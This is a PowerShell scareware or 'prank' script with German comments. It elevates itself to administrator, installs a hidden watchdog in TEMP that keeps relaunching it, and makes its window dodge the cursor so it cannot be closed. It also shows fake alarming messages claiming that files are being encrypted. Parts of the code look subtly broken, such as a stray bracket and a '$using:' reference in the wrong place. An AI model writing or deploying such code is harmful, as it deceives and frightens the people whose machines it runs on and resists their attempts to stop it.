# Administrator-Rechte anfordern
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process PowerShell -Verb RunAs -ArgumentList "-File `"$PSCommandPath`""
    exit
}

# ===== ERROR HANDLING =====
$ErrorActionPreference = "SilentlyContinue"
$Host.UI.RawUI.WindowTitle = "Windows Critical Error"

# ===== WATCHDOG - UNSTERBLICH =====
$watchdogCode = @"
while(`$true) {
    `$trollProcess = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.MainWindowTitle -like "*Critical Error*"}
    if (`$trollProcess.Count -eq 0) {
        Start-Process powershell -WindowStyle Normal -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
    }
    Start-Sleep -Milliseconds 500
}
"@
$watchdogCode | Out-File "$env:TEMP\critical_error.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\critical_error.ps1`""

# ===== FENSTER SPRINGT WEG =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")]
public static extern bool SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
[DllImport("user32.dll")]
public static extern bool GetCursorPos(ref System.Drawing.Point lpPoint);
'@

$consoleHandle = [Console.Window]::GetConsoleWindow()
$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height

# ===== HORROR-SHOW =====
function Show-HorrorMessage {
    param($message)
    
    $popup = New-Object -ComObject Wscript.Shell
    $popup.Popup($message, 3, "KRITISCHER SYSTEMFEHLER", 48)
}

# ===== ÜBERWACHUNG =====
$monitorJob = Start-Job -ScriptBlock {
    param($consoleHandle, $screenWidth, $screenHeight)
    
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -Name Window -Namespace Console -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool GetCursorPos(ref System.Drawing.Point lpPoint);
[DllImport("user32.dll")]
public static extern bool SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
'@
    
    while ($true) {
        $window = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {$_.MainWindowTitle -like "*Critical Error*"} | Select-Object -First 1
        
        if ($window) {
            $hwnd = $window.MainWindowHandle
            $windowRect = $window.MainWindowRect
            $windowX = $windowRect.X
            $windowY = $windowRect.Y
            $windowWidth = $windowRect.Width
            
            $cursorPos = New-Object System.Drawing.Point
            [Console.Window]::GetCursorPos([ref]$cursorPos])
            
            # X-Button Bereich
            $xButtonX = $windowX + $windowWidth - 40
            $xButtonY = $windowY + 10
            
            $mouseOverX = ($cursorPos.X -ge $xButtonX -and 
                          $cursorPos.X -le $xButtonX + 30 -and
                          $cursorPos.Y -ge $xButtonY -and 
                          $cursorPos.Y -le $xButtonY + 30)
            
            if ($mouseOverX) {
                # Fenster wegspringen
                $newX = Get-Random -Minimum 50 -Maximum ($screenWidth - 400)
                $newY = Get-Random -Minimum 50 -Maximum ($screenHeight - 300)
                [Console.Window]::SetWindowPos($hwnd, -1, $newX, $newY, 0, 0, 0x0001 -bor 0x0040)
                
                # Schrecken!
                $msg = Get-Random @(
                    "❌ ZUGRIFF VERWEIGERT!",
                    "💀 DU KANNST MICH NICHT SCHLIESSEN!",
                    "🔐 DATEIEN WERDEN VERSCHLÜSSELT!",
                    "⚠️ 200 NEUE DATEIEN ERSTELLT!",
                    "🎯 VERSUCH ES NOCHMAL!"
                )
                [System.Windows.Forms.MessageBox]::Show($msg, "SYSTEM", "OK", "Error")
            }
        }
        Start-Sleep -Milliseconds 50
    }
} -ArgumentList $consoleHandle, $screenWidth, $screenHeight

